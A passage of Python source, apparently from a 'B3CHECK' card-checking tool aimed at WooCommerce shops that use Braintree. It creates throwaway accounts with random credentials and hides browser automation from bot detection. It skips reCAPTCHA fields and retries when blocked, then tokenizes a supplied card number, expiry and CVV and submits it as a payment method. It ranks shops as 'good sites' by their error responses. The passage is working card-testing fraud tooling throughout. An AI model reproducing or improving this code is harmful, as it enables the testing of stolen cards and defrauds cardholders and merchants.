        if 'woocommerce-login-nonce' in html.lower() or '/my-account/' in final_url.lower() and 'login' in final_url.lower():
            _debug("WARNING: Redirected to login page - session may have been lost")
            _debug(f"Final URL: {final_url}")
            # Try to get the payment page again after a short delay
            time.sleep(1)
            resp = session.get(payment_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
            html = resp.text
            final_url = resp.url
            if 'woocommerce-login-nonce' in html.lower():
                _debug("Still redirected to login - registration session lost")
                return {"success": False, "is_good_site": False, "message": "Session lost after registration - redirected to login", "braintree_type": None}
        
        _debug(f"Successfully accessed payment page: {final_url}")
    except Exception as e:
        _debug(f"Failed to access payment method page: {e}")
        return {"success": False, "is_good_site": False, "message": f"Failed to access payment page: {e}", "braintree_type": None}
    
    # Detect Braintree type
    braintree_type = detect_braintree_type(html)
    _debug(f"Detected Braintree type: {braintree_type}")
    
    if braintree_type == 'none':
        return {"success": False, "is_good_site": False, "message": "No Braintree payment method found", "braintree_type": None}
    
    # Get client token (pass headers for AJAX requests)
    bearer_token = get_client_token(session, base_url, html, headers)
    if not bearer_token:
        _debug("Failed to get client token")
        return {"success": False, "is_good_site": False, "message": "Failed to get Braintree client token", "braintree_type": braintree_type}
    
    _debug("Got client token, tokenizing card...")
    
    # Tokenize card
    card_nonce = tokenize_card_braintree(session, bearer_token, card_num, exp_m, exp_y, card_cvv)
    if not card_nonce:
        _debug("Failed to tokenize card")
        return {"success": False, "is_good_site": False, "message": "Failed to tokenize card", "braintree_type": braintree_type}
    
    _debug("Card tokenized, submitting payment method...")
    
    # Detect payment format (format1, format2, format3)
    format_type = detect_site_payment_format(html)
    _debug(f"Detected payment format: {format_type}")
    
    # Get payment nonce (more comprehensive patterns like b3.py)
    payment_nonce_patterns = [
        r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"',
        r'id="woocommerce-add-payment-method-nonce".*?value="([^"]+)"',
        r'"woocommerce-add-payment-method-nonce".*?value="([^"]+)"',
        r'name=["\']woocommerce-add-payment-method-nonce["\']\s+value=["\']([^"\']+)["\']',
        r'woocommerce-add-payment-method-nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
        r'woocommerce-add-payment-method-nonce["\']?\s*:\s*["\']([^"\']+)["\']',  # JSON format
    ]
    
    payment_nonce = None
    for pattern in payment_nonce_patterns:
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            payment_nonce = match.group(1)
            _debug(f"Found payment nonce via pattern: {pattern[:50]}...")
            break
    
    # Fallback: Try BeautifulSoup extraction
    if not payment_nonce:
        try:
            soup = BeautifulSoup(html, 'html.parser')
            # Try to find by name attribute
            nonce_input = soup.find('input', {'name': 'woocommerce-add-payment-method-nonce'})
            if nonce_input:
                payment_nonce = nonce_input.get('value')
                _debug("Found payment nonce via BeautifulSoup (name)")
            else:
                # Try to find by id
                nonce_input = soup.find('input', {'id': 'woocommerce-add-payment-method-nonce'})
                if nonce_input:
                    payment_nonce = nonce_input.get('value')
                    _debug("Found payment nonce via BeautifulSoup (id)")
        except Exception as e:
            _debug(f"BeautifulSoup extraction failed: {e}")
    
    if not payment_nonce:
        _debug("Payment nonce not found")
        _debug(f"Response URL: {final_url}")
        _debug(f"Response length: {len(html)}")
        
        # Check if we're on login page
        if 'woocommerce-login-nonce' in html.lower():
            _debug("Still on login page - session may have been lost after registration")
            return {"success": False, "is_good_site": False, "message": "Session lost - redirected to login page", "braintree_type": braintree_type}
        
        # Try to find any nonce-like fields as last resort
        all_nonces = re.findall(r'name=["\']([^"\']*nonce[^"\']*)["\'].*?value=["\']([^"\']+)["\']', html, re.IGNORECASE)
        if all_nonces:
            _debug(f"Found {len(all_nonces)} nonce fields, but not the payment method nonce")
            for nonce_name, nonce_value in all_nonces[:3]:  # Show first 3
                _debug(f"  Found nonce: {nonce_name} = {nonce_value[:20]}...")
        
        # Save a snippet of HTML for debugging (look for form elements)
        if len(html) > 0:
            # Look for form tags
            soup_debug = BeautifulSoup(html, 'html.parser')
            forms = soup_debug.find_all('form')
            _debug(f"Found {len(forms)} form(s) on the page")
            for i, form in enumerate(forms[:2]):  # Show first 2 forms
                form_action = form.get('action', 'N/A')
                form_id = form.get('id', 'N/A')
                _debug(f"  Form {i+1}: action={form_action}, id={form_id}")
        
        return {"success": False, "is_good_site": False, "message": "Payment nonce not found", "braintree_type": braintree_type}
    
    _debug(f"Got payment nonce: {payment_nonce[:20]}...")
    
    # Build device data
    sess = generate_random_string(32)
    corr = str(uuid.uuid4())
    device_data_simple, device_data_full = build_device_data(sess, corr)
    
    # Build payment data based on format type (like b3.py)
    if format_type == 'format1':
        payment_data = build_payment_data_format1(card_nonce, payment_nonce, device_data_simple)
        _debug("Using format1 payment data structure")
    elif format_type == 'format2':
        payment_data = build_payment_data_format2(card_nonce, payment_nonce, device_data_simple, None, html)
        _debug("Using format2 payment data structure")
    elif format_type == 'format3':
        config_data = extract_config_data(html)
        if config_data:
            _debug(f"Found config data for format3: {config_data[:50]}...")
        payment_data = build_payment_data_format3(card_nonce, payment_nonce, device_data_full, config_data)
        _debug("Using format3 payment data structure")
    else:
        # Fallback to format1
        payment_data = build_payment_data_format1(card_nonce, payment_nonce, device_data_simple)
        _debug(f"Unknown format type '{format_type}', using format1 as fallback")
    
    # Submit payment method
    headers.update({
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base_url,
    })
    
    try:
        # Format2 returns list of tuples, others return dict
        if isinstance(payment_data, list):
            # Convert list of tuples to dict (format2)
            payment_data_dict = dict(payment_data)
        else:
            payment_data_dict = payment_data
        
        submit_resp = session.post(payment_url, headers=headers, data=payment_data_dict, timeout=15, verify=False, allow_redirects=True)
        response_text = submit_resp.text
    except Exception as e:
        _debug(f"Failed to submit payment method: {e}")
        return {"success": False, "is_good_site": False, "message": f"Failed to submit: {e}", "braintree_type": braintree_type}
    
    # Check response for address-related errors (GOOD SITE indicator)
    response_lower = response_text.lower()
    address_error_keywords = [
        "addresses must have at least one field filled in",
        "postal code is required",
        "postal code",
        "address is required",
        "billing address",
        "status code 81801",
        "status code 81808",
        "edit address",
        "address must",
    ]
    
    is_good_site = any(keyword in response_lower for keyword in address_error_keywords)
    
    # Parse response message
    soup = BeautifulSoup(response_text, "html.parser")
    error_ul = soup.find('ul', class_='woocommerce-error')
    success_div = soup.find('div', class_='woocommerce-message')
    
    message = ""
    if success_div:
        message = success_div.get_text(strip=True)
    elif error_ul:
        message = error_ul.get_text(strip=True)
    else:
        # Check for address errors in text
        for keyword in address_error_keywords:
            if keyword in response_lower:
                message = f"Address required: {keyword}"
                break
    
    if not message:
        message = "Payment method submission completed"
    
    _debug(f"Payment method result: {message}")
    if is_good_site:
        _debug("✅ GOOD SITE - Address required error detected!")
    
    return {
        "success": True,
        "is_good_site": is_good_site,
        "message": message,
        "braintree_type": braintree_type,
    }


def verify_registration_success(session: requests.Session, account_url: str) -> bool:
    """
    Verify if registration was successful by checking if registration form still exists.
    Returns True if logged in (no registration form), False if still shows registration form.
    """
    try:
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": account_url,
        }
        resp = session.get(account_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
        resp.raise_for_status()
        
        soup = BeautifulSoup(resp.text, "html.parser")
        
        # Check if registration form still exists
        registration_form = _find_registration_form(soup)
        if registration_form is not None:
            _debug("Registration form still exists - registration likely failed")
            return False
        
        # Check if we're logged in (logout link, dashboard, etc.)
        is_logged_in = _is_logged_in_account_page(soup)
        if is_logged_in:
            _debug("Registration verified: User is logged in (no registration form, logout link found)")
            return True
        else:
            _debug("Registration status unclear: No registration form but also no clear login indicators")
            # If no registration form and no clear login, assume success (some sites don't show logout immediately)
            return True
        
    except Exception as e:
        _debug(f"Error verifying registration: {e}")
        return False


def register_new_account_selenium(register_url: str, max_retries: int = 3, session: requests.Session = None):
    """
    TEMPORARY: Playwright version to see what's happening visually.
    Registers a new account using Playwright (visible browser).
    Returns tuple: (success: bool, cookies_dict: dict) if successful, or (None, None) if failed
    """
    print("\n" + "="*60)
    print("[B3CHECK] PLAYWRIGHT REGISTRATION FUNCTION CALLED")
    print("="*60)
    
    if not PLAYWRIGHT_AVAILABLE:
        print("[B3CHECK] ERROR: Playwright not available!")
        print("[B3CHECK] Install with: pip install playwright && playwright install chromium")
        _debug("Playwright not available, falling back to requests method")
        result = register_new_account(register_url, session, max_retries)
        return (True, {}) if result else (None, None)
    
    print("[B3CHECK] Playwright is available ✓")
    _debug("=" * 60)
    _debug("Using Playwright (VISIBLE BROWSER) for registration")
    _debug(f"Registration URL: {register_url}")
    _debug("=" * 60)
    
    playwright = None
    browser = None
    page = None
    
    try:
        _debug("Attempting to start browser...")
        _debug("This may take a few seconds...")
        
        playwright = sync_playwright().start()
        
        # Launch browser (visible, not headless)
        browser = playwright.chromium.launch(
            headless=False,  # Visible browser
            args=[
                '--disable-blink-features=AutomationControlled',
                '--disable-dev-shm-usage',
                '--no-sandbox'
            ]
        )
        
        # Create context and page
        context = browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        )
        page = context.new_page()
        
        _debug("✓ Browser started successfully!")
        _debug(f"Opening browser: {register_url}")
        page.goto(register_url, wait_until='load', timeout=30000)
        # Wait for page to fully load (network idle)
        try:
            page.wait_for_load_state('networkidle', timeout=10000)
        except:
            page.wait_for_timeout(2000)  # Fallback timeout
        _debug("✓ Page fully loaded")
        
        # RETRY LOOP: Retry if email validation error or CAPTCHA error
        email_retry_count = 0
        max_email_retries = 1
        
        for registration_attempt in range(1, max_retries + 1):
            if registration_attempt > 1:
                _debug(f"\n--- Retry Registration Attempt {registration_attempt}/{max_retries} ---")
                # Refresh page to get fresh form
                page.reload(wait_until='load')
                # Wait for page to fully load
                try:
                    page.wait_for_load_state('networkidle', timeout=10000)
                except:
                    page.wait_for_timeout(2000)  # Fallback timeout
                _debug("✓ Page fully loaded after reload")
            
            # STEP 1: Check if form is visible on this attempt
            _debug(f"\n--- Step 1: Checking form visibility (Attempt {registration_attempt}) ---")
            form_visible_this_attempt = False
            register_button_clicked = False
            register_button = None
            # Check if email field is already visible (form is visible) - check in registration form context
            try:
                # First check if registration form exists and is visible
                reg_form = page.locator("form.woocommerce-form-register, form[action*='register']").first
                if reg_form.is_visible(timeout=2000):
                    # Form exists, check for email field in it
                    email_in_form = reg_form.locator("input[type='email'], input[name*='email'], input[id*='email']").first
                    if email_in_form.is_visible(timeout=1000):
                        form_visible_this_attempt = True
                        _debug("✓ Email field is visible in registration form - form is already shown")
                else:
                    # Form might exist but not visible, or doesn't exist - check for any visible email field
                    email_inputs = page.locator("input[type='email'], input[name*='email'], input[id*='email']").all()
                    for inp in email_inputs:
                        try:
                            if inp.is_visible():
                                # Check if it's in a registration form context (not login form)
                                parent_html = inp.evaluate("el => el.closest('form')?.outerHTML || ''")
                                if parent_html and ('register' in parent_html.lower() or 'my-account' in parent_html.lower()):
                                    form_visible_this_attempt = True
                                    _debug("✓ Email field is visible - registration form is already shown")
                                    break
                        except:
                            continue
            except Exception as e:
                _debug(f"Error checking email field visibility: {e}")
            
            # If form not visible, click REGISTER button to reveal it
            if not form_visible_this_attempt:
                _debug("Registration form not visible - looking for REGISTER button to click...")
                register_button = None
                
                # Try multiple methods to find register button (NOT submit buttons)
                # Method 1: Use get_by_text for buttons with "REGISTER" or "Register" text
                try:
                    buttons_text = page.get_by_text("REGISTER", exact=False).all()
                    buttons_text.extend(page.get_by_text("Register", exact=False).all())
                    for btn in buttons_text:
                        try:
                            tag_name = btn.evaluate("el => el.tagName.toLowerCase()")
                            if tag_name == 'button' or tag_name == 'a':
                                btn_type = btn.get_attribute('type') or ''
                                if btn_type.lower() != 'submit' and btn.is_visible():
                                    register_button = btn
                                    _debug("Found REGISTER button using get_by_text")
                                    break
                        except:
                            continue
                except:
                    pass
                
                # Method 2: Try CSS selectors for buttons/inputs with register
                if not register_button:
                    try:
                        css_selectors = [
                            "button[type='button']",
                            "a[href*='register']",
                            ".woocommerce-form-register-toggle button",
                            ".woocommerce-form-register-toggle a",
                            "button.register",
                            "button[class*='register']",
                            "button[id*='register']"
                        ]
                        for selector in css_selectors:
                            try:
                                buttons = page.locator(selector).all()
                                for btn in buttons:
                                    try:
                                        if btn.is_visible():
                                            btn_text = btn.inner_text().upper()
                                            btn_type = btn.get_attribute('type') or ''
                                            if ('REGISTER' in btn_text or 'REGISTER' in btn.get_attribute('value') or '') and btn_type.lower() != 'submit':
                                                register_button = btn
                                                _debug(f"Found REGISTER button using CSS: {selector}")
                                                break
                                    except:
                                        continue
                                if register_button:
                                    break
                            except:
                                continue
                    except:
                        pass
                
                # Method 3: Try input buttons with value containing REGISTER
                if not register_button:
                    try:
                        inputs = page.locator("input[type='button'], input[value*='REGISTER'], input[value*='Register']").all()
                        for inp in inputs:
                            try:
                                if inp.is_visible():
                                    inp_value = inp.get_attribute('value') or ''
                                    if 'REGISTER' in inp_value.upper():
                                        register_button = inp
                                        _debug("Found REGISTER button using input selector")
                                        break
                            except:
                                continue
                    except:
                        pass
                
                if register_button:
                    # Click it
                    try:
                        register_button.scroll_into_view_if_needed()
                        page.wait_for_timeout(500)
                        register_button.click(timeout=20000)
                        register_button_clicked = True
                        _debug("✓ Clicked REGISTER button to reveal form")
                        # Wait for page to fully load after clicking register button
                        try:
                            page.wait_for_load_state('networkidle', timeout=10000)
                        except:
                            page.wait_for_timeout(2000)  # Fallback timeout
                        _debug("✓ Page fully loaded after clicking register button")
                        
                        # Verify form appeared
                        try:
                            email_check = page.locator("input[type='email'], input[name*='email'], input[id*='email']").first
                            if email_check.is_visible(timeout=2000):
                                form_visible_this_attempt = True
                                _debug("✓ Form is now visible after clicking register button")
                        except:
                            pass
                    except Exception as e:
                        _debug(f"Could not click REGISTER button: {e}")
            
            if not form_visible_this_attempt:
                _debug("⚠️ Registration form still not visible after attempts")
                if registration_attempt < max_retries:
                    continue
                else:
                    if browser:
                        browser.close()
                    if playwright:
                        playwright.stop()
                    return (None, None)
            
            # STEP 2: Now find the registration form (after clicking button if needed)
            _debug("\n--- Step 2: Looking for registration form fields ---")
            form = None
            form_selectors = [
                "form[action*='register']",
                "form.woocommerce-form-register",
                "form#registerform",
                "form.register-form",
                "form[method='post']"
            ]
            
            for selector in form_selectors:
                try:
                    found_form = page.locator(selector).first
                    if found_form.is_visible():
                        form = found_form
                        _debug(f"Found visible registration form using selector: {selector}")
                        break
                except:
                    continue
            
            if not form:
                # Try to find any form on the page
                forms = page.locator("form").all()
                for f in forms:
                    try:
                        if f.is_visible():
                            form_html = f.evaluate("el => el.outerHTML")
                            if 'register' in form_html.lower() or 'email' in form_html.lower():
                                form = f
                                _debug("Found registration form by content")
                                break
                    except:
                        continue
            
            _debug("\n--- Step 3: Analyzing Form Fields ---")
            email_field = None
            username_field = None
            password_field = None
            email_2_field = None
            
            # Find all input fields (search in form if exists, otherwise search entire page)
            # IMPORTANT: Re-find fields after clicking REGISTER button
            if form:
                inputs = form.locator("input").all()
                _debug(f"Searching in form: found {len(inputs)} input fields")
            else:
                # Form not found, search entire page for email fields
                _debug("Form not found, searching entire page for email fields...")
                inputs = page.locator("input").all()
                _debug(f"Found {len(inputs)} input fields on entire page")
            
            _debug(f"Analyzing {len(inputs)} input fields...")
            
            for inp in inputs:
                try:
                    field_name = inp.get_attribute('name') or ''
                    field_type = (inp.get_attribute('type') or '').lower()
                    field_id = inp.get_attribute('id') or ''
                    
                    # For email fields: prefer visible ones, but accept hidden if that's all we have
                    # For other fields: skip if not displayed (except hidden fields needed for form submission)
                    is_displayed = inp.is_visible()
                    if field_type != 'hidden' and not is_displayed:
                        continue  # Skip non-visible fields (except hidden ones)
                    
                    if field_type in ['submit', 'button', 'hidden']:
                        if field_type == 'hidden':
                            _debug(f"  Hidden field: {field_name} = {inp.get_attribute('value')}")
                        continue
                    
                    # Skip reCAPTCHA
                    if 'recaptcha' in field_name.lower():
                        _debug(f"  Skipping reCAPTCHA field: {field_name}")
                        continue
                    
                    # Find email field - prioritize visible email fields
                    if field_name.lower() == 'email' or field_type == 'email':
                        if not email_field or inp.is_visible():  # Prefer displayed email fields
                            email_field = inp
                            is_visible = "visible" if inp.is_visible() else "hidden"
                            _debug(f"  ✓ Found EMAIL field: name='{field_name}', type='{field_type}', id='{field_id}', {is_visible}")
                    elif field_name.lower() == 'email_2':
                        email_2_field = inp
                        _debug(f"  ✓ Found EMAIL_2 field (confirmation): name='{field_name}'")
                    elif 'user' in field_name.lower() and 'name' in field_name.lower():
                        username_field = inp
                        _debug(f"  ✓ Found USERNAME field: name='{field_name}'")
                    elif 'pass' in field_name.lower() or field_type == 'password':
                        password_field = inp
                        _debug(f"  ✓ Found PASSWORD field: name='{field_name}'")
                    else:
                        _debug(f"  ? Other field: name='{field_name}', type='{field_type}'")
                except Exception as e:
                    _debug(f"  Error analyzing field: {e}")
                    continue
            
            # Generate credentials
            if email_retry_count < max_email_retries:
                random_email = generate_random_email()
            else:
                random_email = generate_realistic_email()  # Use realistic email on retry
            
            random_username = generate_random_username()
            random_password = generate_random_password()
            
            _debug(f"\n--- Step 4: Filling Form (Attempt {registration_attempt}) ---")
            _debug(f"Email: {random_email}")
            
            # Wait for page to fully load before entering email
            try:
                page.wait_for_load_state('networkidle', timeout=10000)
            except:
                page.wait_for_timeout(1000)  # Fallback timeout
            _debug("✓ Page fully loaded, ready to enter email")
            
            # Fill email field (required)
            if email_field:
                _debug(f"Filling email field...")
                try:
                    email_field.scroll_into_view_if_needed()
                    page.wait_for_timeout(300)
                    email_field.fill(random_email)
                    page.wait_for_timeout(500)
                except Exception as e:
                    _debug(f"Error filling email field: {e}, trying JavaScript...")
                    email_field.evaluate(f"el => el.value = '{random_email}'")
                    page.wait_for_timeout(500)
            elif email_2_field:
                _debug(f"Using email_2 field as main email...")
                try:
                    email_2_field.scroll_into_view_if_needed()
                    page.wait_for_timeout(300)
                    email_2_field.fill(random_email)
                    page.wait_for_timeout(500)
                except Exception as e:
                    email_2_field.evaluate(f"el => el.value = '{random_email}'")
                    page.wait_for_timeout(500)
            else:
                _debug("ERROR: No email field found!")
                if registration_attempt < max_retries:
                    continue
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
                return (None, None)
            
            # Fill email_2 if present
            if email_2_field and email_field:
                _debug(f"Filling email_2 (confirmation)...")
                email_2_field.fill(random_email)
                page.wait_for_timeout(500)
            
            # Fill username if present
            if username_field:
                _debug(f"Filling username: {random_username}")
                username_field.fill(random_username)
                page.wait_for_timeout(500)
            
            # Fill password if present
            if password_field:
                _debug(f"Filling password: {random_password}")
                password_field.fill(random_password)
                page.wait_for_timeout(500)
            
            # Find and click submit button
            _debug(f"\n--- Step 5: Submitting Form (Attempt {registration_attempt}) ---")
            _debug("Searching for REGISTER submit button...")
            submit_button = None
            
            # Method 1: Language-agnostic - Find submit button in the form (most reliable, works in any language)
            if form:
                try:
                    form_buttons = form.locator("button[type='submit'], input[type='submit']").all()
                    if form_buttons:
                        submit_button = form_buttons[0]
                        _debug(f"Found submit button in form (language-agnostic): {submit_button.get_attribute('value') or submit_button.inner_text() or submit_button.get_attribute('class')}")
                except Exception as e:
                    _debug(f"Error searching in form: {e}")
            
            # Method 2: Find submit button near the email field (language-agnostic)
            if not submit_button and email_field:
                try:
                    # Find parent form of email field
                    email_parent = email_field.locator("xpath=./ancestor::form[1]").first
                    submit_buttons = email_parent.locator("button[type='submit'], input[type='submit']").all()
                    if submit_buttons:
                        submit_button = submit_buttons[0]
                        _debug(f"Found submit button in email field's form (language-agnostic)")
                except:
                    pass
            
            # Method 3: Language-agnostic CSS selectors (by class/id patterns)
            if not submit_button:
                submit_selectors = [
                    # WooCommerce specific (works regardless of language)
                    ".woocommerce-form-register button[type='submit']",
                    ".woocommerce-form-register input[type='submit']",
                    ".woocommerce-form-register button",
                    # Common patterns
                    "button[type='submit'].register",
                    "input[type='submit'].register",
                    "button[type='submit']",
                    "input[type='submit']",
                    # Fallback: any submit button
                    "form button[type='submit']",
                    "form input[type='submit']"
                ]
                
                for selector in submit_selectors:
                    try:
                        elements = page.locator(selector).all()
                        for element in elements:
                            try:
                                if element.is_visible():
                                    submit_button = element
                                    _debug(f"Found submit button using selector (language-agnostic): {selector}")
                                    break
                            except:
                                continue
                        if submit_button:
                            break
                    except:
                        continue
            
            # Method 4: Search by text content (fallback - tries multiple languages)
            if not submit_button:
                try:
                    all_buttons = page.locator("button").all()
                    all_inputs = page.locator("input[type='submit'], input[type='button']").all()
                    
                    # Common register/submit-related words in multiple languages
                    submit_keywords = [
                        'register', 'signup', 'sign-up', 'sign_up', 'create account', 'submit', 'send', 'continue',
                        # Spanish
                        'registro', 'registrarse', 'crear cuenta', 'enviar', 'continuar',
                        # French
                        'inscription', 'creer compte', 'envoyer', 'continuer',
                        # German
                        'registrieren', 'konto erstellen', 'senden', 'fortfahren',
                        # Portuguese
                        'registro', 'cadastro', 'criar conta', 'enviar', 'continuar',
                        # Italian
                        'registrazione', 'iscriversi', 'invia', 'continua',
                        # Japanese (romaji)
                        'touroku', 'shinki', 'soushin', 'tsuzukeru',
                        # Chinese (pinyin)
                        'zhuce', 'fabu', 'jixu',
                        # Russian (transliterated)
                        'registratsiya', 'otpravit', 'prodolzhit'
                    ]
                    
                    for element in all_buttons + all_inputs:
                        try:
                            if not element.is_visible():
                                continue
                            element_type = (element.get_attribute('type') or '').lower()
                            if element_type != 'submit':
                                continue
                            
                            element_text = (element.inner_text() or element.get_attribute('value') or '').lower()
                            element_class = (element.get_attribute('class') or '').lower()
                            element_id = (element.get_attribute('id') or '').lower()
                            
                            # Check if any keyword matches
                            for keyword in submit_keywords:
                                if keyword in element_text or keyword in element_class or keyword in element_id:
                                    submit_button = element
                                    _debug(f"Found submit button by text (multi-language): text='{element_text[:50]}', keyword='{keyword}'")
                                    break
                            if submit_button:
                                break
                        except:
                            continue
                except Exception as e:
                    _debug(f"Error searching by text: {e}")
            
            if not submit_button:
                _debug("ERROR: Submit button not found!")
                _debug("Taking screenshot for debugging...")
                try:
                    page.screenshot(path="submit_button_not_found.png")
                    _debug("Screenshot saved as submit_button_not_found.png")
                except:
                    pass
                if registration_attempt < max_retries:
                    continue
                _debug("Keeping browser open for 15 seconds so you can inspect...")
                page.wait_for_timeout(15000)
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
                return (None, None)
        
            _debug(f"Found submit button: {submit_button.get_attribute('value') or submit_button.inner_text()}")
            _debug("Clicking register button...")
            
            # Wait for page to fully load before clicking register button
            try:
                page.wait_for_load_state('networkidle', timeout=10000)
            except:
                page.wait_for_timeout(1000)  # Fallback timeout
            _debug("✓ Page fully loaded, ready to click register button")
            
            # Scroll to button and make sure it's visible
            submit_button.scroll_into_view_if_needed()
            page.wait_for_timeout(500)
            
            # Try multiple click methods
            clicked = False
            try:
                # Method 1: Normal click
                if submit_button.is_visible() and submit_button.is_enabled():
                    submit_button.click(timeout=20000)
                    clicked = True
                    _debug("✓ Clicked using normal click")
            except Exception as e:
                _debug(f"Normal click failed: {e}")
            
            if not clicked:
                try:
                    # Method 2: JavaScript click
                    submit_button.evaluate("element => element.click()")
                    clicked = True
                    _debug("✓ Clicked using JavaScript click")
                except Exception as e:
                    _debug(f"JavaScript click failed: {e}")
            
            if not clicked:
                _debug("ERROR: Could not click submit button!")
                if registration_attempt < max_retries:
                    continue
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
                return (None, None)
            
            _debug("Form submitted! Waiting for page to fully load...")
            # Wait for page to fully load after clicking register
            try:
                page.wait_for_load_state('networkidle', timeout=15000)
            except:
                page.wait_for_timeout(3000)  # Fallback timeout
            _debug("✓ Page fully loaded after registration submission")
            
            # Check current URL and page content
            current_url = page.url
            
            _debug(f"\n--- Step 6: Response Analysis (Attempt {registration_attempt}) ---")
            _debug(f"Current URL: {current_url}")
            
            # MAIN SUCCESS CHECK: After submitting, check if register form/button still exists
            # If register form/button is NOT there, registration was successful
            register_form_still_exists = False
            try:
                # Method 1: Check if email field still exists (form still visible)
                email_field_check = page.locator("input[type='email'], input[name*='email'], input[id*='email']").first
                if email_field_check.is_visible(timeout=2000):
                    register_form_still_exists = True
                    _debug("Email field still exists - registration form still visible")
                
                # Method 2: Check if registration form still exists
                if not register_form_still_exists:
                    try:
                        form_check = page.locator("form[action*='register'], form.woocommerce-form-register").first
                        if form_check.is_visible(timeout=1000):
                            register_form_still_exists = True
                            _debug("Registration form still exists")
                    except:
                        pass
                
                # Method 3: Check for register submit buttons
                if not register_form_still_exists:
                    register_button_selectors = [
                        "button[type='submit']:has-text('register'), button[type='submit']:has-text('Register'), button[type='submit']:has-text('REGISTER')",
                        "input[type='submit'][value*='register' i]",
                        ".woocommerce-form-register button[type='submit']",
                        ".woocommerce-form-register input[type='submit']"
                    ]
                    
                    for selector in register_button_selectors:
                        try:
                            btn_check = page.locator(selector).first
                            if btn_check.is_visible(timeout=1000):
                                register_form_still_exists = True
                                _debug(f"Register submit button still exists: {selector}")
                                break
                        except:
                            continue
                        
            except Exception as e:
                _debug(f"Error checking for register form: {e}")
            
            # Check for error messages (for retry logic)
            error_found = False
            error_texts = []
            email_validation_error = False
            try:
                error_elements = page.locator(".woocommerce-error, .error, .notice-error, .woocommerce-message--error").all()
                if error_elements:
                    error_found = True
                    for err in error_elements:
                        error_text = err.inner_text().strip()
                        if error_text:
                            error_texts.append(error_text)
                            _debug(f"ERROR FOUND: {error_text}")
                            # Check if it's email validation error
                            if 'valid email' in error_text.lower() or 'please provide a valid email' in error_text.lower():
                                email_validation_error = True
            except:
                pass
            
            # If email validation error, retry with realistic email
            if email_validation_error and email_retry_count < max_email_retries:
                _debug(f"\n[-] Email validation error detected: {error_texts}")
                _debug(f"Retrying with realistic email format (attempt {email_retry_count + 1}/{max_email_retries})...")
                email_retry_count += 1
                continue  # Retry with realistic email
            
            # SUCCESS: Register form/button is NOT there = registration successful
            if not register_form_still_exists:
                _debug("\n[+] REGISTRATION SUCCESSFUL!")
                _debug("Register form/button no longer exists - registration completed")
                
                # Extract cookies from Playwright and transfer to requests session
                playwright_cookies = context.cookies()
                cookies_dict = {}
                for cookie in playwright_cookies:
                    cookies_dict[cookie['name']] = cookie['value']
                
                _debug(f"Extracted {len(cookies_dict)} cookies from Playwright session")
                _debug("Keeping browser open for 5 seconds so you can see the result...")
                page.wait_for_timeout(5000)
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
                return (True, cookies_dict)
            
            # FAILED: Register form still exists = registration failed
            else:
                _debug(f"\n[-] REGISTRATION FAILED - Register form/button still exists")
                if error_found:
                    _debug(f"Errors detected: {error_texts}")
                
                # If CAPTCHA error or other error, retry
                if registration_attempt < max_retries:
                    _debug(f"Will retry registration (attempt {registration_attempt + 1}/{max_retries})...")
                    continue
                
                _debug("Keeping browser open for 10 seconds so you can see the errors...")
                page.wait_for_timeout(10000)
                if browser:
                    browser.close()
                if playwright:
                    playwright.stop()
                return (None, None)
            
    except Exception as e:
        _debug(f"ERROR during Playwright registration: {e}")
        import traceback
        _debug(traceback.format_exc())
        _debug("Keeping browser open for 10 seconds...")
        try:
            if page:
                page.wait_for_timeout(10000)
            if browser:
                browser.close()
            if playwright:
                playwright.stop()
        except:
            pass
        return (None, None)
            
    except Exception as e:
        _debug(f"ERROR setting up Playwright: {e}")
        if browser:
            browser.close()
        if playwright:
            playwright.stop()
        return (None, None)


def register_new_account(register_url: str, session: requests.Session = None, max_retries: int = 3) -> requests.Session | None:
    """
    Registers a new account by analyzing the form first to determine what fields are needed.
    Only sends the required fields (email only, or email+username, or email+username+password, etc.).
    If reCAPTCHA error occurs, will retry clicking register button in the same session.
    """
    sess = session or requests.Session()
    
    # First, GET the form and analyze what fields are needed
    try:
        headers = {
            "User-Agent": UserAgent().random,
            "Referer": register_url,
        }
        get_resp = sess.get(register_url, headers=headers, timeout=15, verify=False, allow_redirects=True)
        get_resp.raise_for_status()
        soup = BeautifulSoup(get_resp.text, "html.parser")
        
        # Find the registration form
        registration_form = _find_registration_form(soup)
        if not registration_form:
            _debug("Registration form not found on page")
            return None
        
        # Analyze form to determine required fields
        form_inputs = registration_form.find_all(['input', 'select', 'textarea'])
        required_fields = {}  # Fields that need to be filled
        hidden_fields = {}  # Hidden fields (nonces, etc.) - always include
        
        email_field_name = None
        username_field_name = None
        password_field_name = None
        
        for inp in form_inputs:
            field_name = inp.get('name')
            if not field_name:
                continue
            
            field_type = (inp.get('type') or '').lower()
            
            # Skip submit buttons
            if field_type in ['submit', 'button', 'image']:
                continue
            
            # Always include hidden fields (nonces, etc.)
            if field_type == 'hidden':
                hidden_fields[field_name] = inp.get('value', '')
                continue
            
            # Skip reCAPTCHA fields - we'll submit without them and retry if needed (like infinitediscsvipclub.com)
            if 'recaptcha' in field_name.lower():
                continue  # Don't include reCAPTCHA field, just submit with email
            
            # Check if field is required (has required attribute, asterisk in label, or is visible text/email input)
            is_required = inp.get('required') is not None or inp.has_attr('required')
            
            # For visible text/email inputs, consider them required if they're not hidden
            is_visible_input = field_type in ['text', 'email', 'password'] and field_type != 'hidden'
            
            # Check field type and name to determine what it is
            name_lower = field_name.lower()
            itype = field_type
            
            # Email field - prioritize main email field over email_2
            if (name_lower == 'email' or itype == 'email') and name_lower != 'email_2':
                # Main email field (not email_2)
                if not email_field_name or email_field_name == 'email_2':
                    email_field_name = field_name
                    # Always include email field if found (even if CAPTCHA present, just send email)
                    required_fields[field_name] = ''  # Will fill later
            
            # Email confirmation field (email_2) - only include if main email not found
            elif name_lower == 'email_2':
                # Only use email_2 as main email if no other email field found
                if not email_field_name:
                    email_field_name = field_name
                    required_fields[field_name] = ''
